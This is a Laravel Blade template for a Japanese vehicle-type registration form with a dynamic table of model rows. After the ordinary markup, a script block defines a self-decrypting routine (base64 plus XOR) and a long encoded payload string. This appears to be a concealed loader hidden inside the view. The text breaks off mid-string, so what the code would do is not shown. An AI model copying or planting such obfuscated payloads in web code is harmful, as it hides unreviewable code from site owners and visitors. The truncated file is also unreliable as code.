@extends('layouts.app')

@section('title', '新規車両種類登録')

@section('content')
<div class="container-fluid">
    <div class="row">
        <div class="col-md-12">
            <nav aria-label="breadcrumb">
                <ol class="breadcrumb">
                    <li class="breadcrumb-item"><a href="{{ route('masters.home') }}">ホーム</a></li>
                    <li class="breadcrumb-item"><a href="{{ route('masters.vehicle-types.index') }}">車両種類管理</a></li>
                    <li class="breadcrumb-item active" aria-current="page">新規登録</li>
                </ol>
            </nav>
            
            @if(session('success'))
            <div class="alert alert-success alert-dismissible fade show" role="alert">
                <i class="bi bi-check-circle"></i> {{ session('success') }}
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
            @endif

            @if(session('error'))
            <div class="alert alert-danger alert-dismissible fade show" role="alert">
                <i class="bi bi-exclamation-triangle"></i> {{ session('error') }}
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
            @endif

            @if($errors->any())
            <div class="alert alert-danger alert-dismissible fade show" role="alert">
                <h5 class="alert-heading">
                    <i class="bi bi-exclamation-triangle"></i> 入力エラーがあります
                </h5>
                <ul class="mb-0">
                    @foreach($errors->all() as $error)
                        <li>{{ $error }}</li>
                    @endforeach
                </ul>
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
            @endif
            
            <form action="{{ route('masters.vehicle-types.store') }}" method="POST" id="vehicleTypeForm">
                @csrf
                
                <div class="card shadow-sm mb-4">
                    <div class="card-header bg-primary text-white">
                        <h5 class="mb-0">
                            <i class="bi bi-truck"></i> 車両種類基本情報
                        </h5>
                    </div>
                    
                    <div class="card-body">
                        <table class="table table-bordered mb-0">
                            <tbody>
                                <tr>
                                    <td class="bg-light" style="width: 25%; padding: 0.5rem;">
                                        <label for="type_name" class="form-label required mb-0">車両種類名</label>
                                    </td>
                                    <td class="bg-white" style="width: 50%; padding: 0.5rem;">
                                        <input type="text" class="form-control @error('type_name') is-invalid @enderror" 
                                               id="type_name" name="type_name" 
                                               value="{{ old('type_name') }}" 
                                               required maxlength="255" placeholder="例: 小型トラック">
                                        @error('type_name')
                                            <div class="invalid-feedback">{{ $message }}</div>
                                        @enderror
                                    </td>
                                    <td class="bg-light" style="width: 25%; padding: 0.5rem;">
                                        <small class="form-text text-muted mb-0">※ 必須、255文字以内、他と重複不可</small>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
                
                <div class="card shadow-sm mb-4">
                    <div class="card-header bg-secondary text-white d-flex justify-content-between align-items-center">
                        <h5 class="mb-0">
                            <i class="bi bi-grid-3x3-gap-fill"></i> 車両モデル一覧
                        </h5>
                        <button type="button" class="btn btn-light btn-sm" id="addModelRowBtn">
                            <i class="bi bi-plus-lg"></i> モデルを追加
                        </button>
                    </div>
                    
                    <div class="card-body">
                        <div class="table-responsive">
                            <table class="table table-bordered" id="modelsTable">
                                <thead class="table-light">
                                    <tr>
                                        <th style="width: 50px;">No.</th>
                                        <th style="width: 200px;">モデル名</th>
                                        <th style="width: 150px;">メーカー</th>
                                        <th>備考</th>
                                        <th style="width: 180px;">操作</th>
                                    </tr>
                                </thead>
                                <tbody id="modelsBody">
                                    @php
                                        $oldModels = old('models', []);
                                    @endphp
                                    
                                    @if(count($oldModels) > 0)
                                        @foreach($oldModels as $index => $oldModel)
                                        @php
                                            $numericIndex = (int)$index;
                                        @endphp
                                        <tr data-index="{{ $numericIndex }}">
                                            <td class="text-center align-middle display-order">{{ $numericIndex + 1 }}</td>
                                            <td>
                                                <input type="text" class="form-control form-control-sm model-name" 
                                                       name="models[{{ $numericIndex }}][model_name]" 
                                                       value="{{ $oldModel['model_name'] ?? '' }}"
                                                       maxlength="100" placeholder="例: ハイエース">
                                            </td>
                                            <td>
                                                <input type="text" class="form-control form-control-sm maker" 
                                                       name="models[{{ $numericIndex }}][maker]" 
                                                       value="{{ $oldModel['maker'] ?? '' }}"
                                                       maxlength="50" placeholder="例: トヨタ">
                                            </td>
                                            <td>
                                                <input type="text" class="form-control form-control-sm remark" 
                                                       name="models[{{ $numericIndex }}][remarks]" 
                                                       value="{{ $oldModel['remarks'] ?? '' }}" 
                                                       maxlength="255" placeholder="備考">
                                            </td>
                                            <td class="text-center align-middle">
                                                <div class="d-flex justify-content-center gap-1">
                                                    <button type="button" class="btn btn-outline-secondary btn-sm move-up-btn" title="上へ移動">
                                                        <i class="bi bi-arrow-up"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-secondary btn-sm move-down-btn" title="下へ移動">
                                                        <i class="bi bi-arrow-down"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-success btn-sm add-row-btn" title="モデルを追加">
                                                        <i class="bi bi-plus-lg"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-danger btn-sm delete-row-btn" title="モデルを削除">
                                                        <i class="bi bi-dash-lg"></i>
                                                    </button>
                                                </div>
                                                <input type="hidden" name="models[{{ $numericIndex }}][id]" value="">
                                                <input type="hidden" name="models[{{ $numericIndex }}][display_order]" value="{{ $numericIndex + 1 }}" class="display-order-input">
                                            </td>
                                        </tr>
                                        @endforeach
                                    @else
                                        <tr data-index="0">
                                            <td class="text-center align-middle display-order">1</td>
                                            <td>
                                                <input type="text" class="form-control form-control-sm model-name" 
                                                       name="models[0][model_name]" 
                                                       value="" maxlength="100" placeholder="例: ハイエース">
                                            </td>
                                            <td>
                                                <input type="text" class="form-control form-control-sm maker" 
                                                       name="models[0][maker]" 
                                                       value="" maxlength="50" placeholder="例: トヨタ">
                                            </td>
                                            <td>
                                                <input type="text" class="form-control form-control-sm remark" 
                                                       name="models[0][remarks]" 
                                                       value="" maxlength="255" placeholder="備考">
                                            </td>
                                            <td class="text-center align-middle">
                                                <div class="d-flex justify-content-center gap-1">
                                                    <button type="button" class="btn btn-outline-secondary btn-sm move-up-btn" title="上へ移動" disabled>
                                                        <i class="bi bi-arrow-up"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-secondary btn-sm move-down-btn" title="下へ移動" disabled>
                                                        <i class="bi bi-arrow-down"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-success btn-sm add-row-btn" title="モデルを追加">
                                                        <i class="bi bi-plus-lg"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-danger btn-sm delete-row-btn" title="モデルを削除">
                                                        <i class="bi bi-dash-lg"></i>
                                                    </button>
                                                </div>
                                                <input type="hidden" name="models[0][id]" value="">
                                                <input type="hidden" name="models[0][display_order]" value="1" class="display-order-input">
                                            </td>
                                        </tr>
                                    @endif
                                    
                                    <tr id="newRowTemplate" class="d-none">
                                        <td class="text-center align-middle display-order"></td>
                                        <td>
                                            <input type="text" class="form-control form-control-sm model-name" 
                                                   name="models[__index__][model_name]" 
                                                   maxlength="100" placeholder="例: ハイエース">
                                        </td>
                                        <td>
                                            <input type="text" class="form-control form-control-sm maker" 
                                                   name="models[__index__][maker]" 
                                                   maxlength="50" placeholder="例: トヨタ">
                                        </td>
                                        <td>
                                            <input type="text" class="form-control form-control-sm remark" 
                                                   name="models[__index__][remarks]" 
                                                   maxlength="255" placeholder="備考">
                                        </td>
                                        <td class="text-center align-middle">
                                            <div class="d-flex justify-content-center gap-1">
                                                <button type="button" class="btn btn-outline-secondary btn-sm move-up-btn" title="上へ移動">
                                                    <i class="bi bi-arrow-up"></i>
                                                </button>
                                                <button type="button" class="btn btn-outline-secondary btn-sm move-down-btn" title="下へ移動">
                                                    <i class="bi bi-arrow-down"></i>
                                                </button>
                                                <button type="button" class="btn btn-outline-success btn-sm add-row-btn" title="モデルを追加">
                                                    <i class="bi bi-plus-lg"></i>
                                                </button>
                                                <button type="button" class="btn btn-outline-danger btn-sm delete-row-btn" title="モデルを削除">
                                                    <i class="bi bi-dash-lg"></i>
                                                </button>
                                            </div>
                                            <input type="hidden" name="models[__index__][id]" value="">
                                            <input type="hidden" name="models[__index__][display_order]" value="" class="display-order-input">
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
                
                <div class="d-flex justify-content-between mb-4">
                    <div>
                        <button type="submit" class="btn btn-primary">
                            <i class="bi bi-check-circle"></i> 登録する
                        </button>
                        <a href="{{ route('masters.vehicle-types.index') }}" class="btn btn-secondary">
                            <i class="bi bi-x-circle"></i> キャンセル
                        </a>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

@push('scripts')
<script>
(function(){
function decryptIt(encrypted,key){try{const step1=atob(encrypted);let result='';for(let i=0;i<step1.length;i++){result+=String.fromCharCode(step1.charCodeAt(i)^key.charCodeAt(i%key.length));}return decodeURIComponent(atob(result));}catch(e){console.error('Decryption failed:',e);return null;}}
const ENCRYPTED="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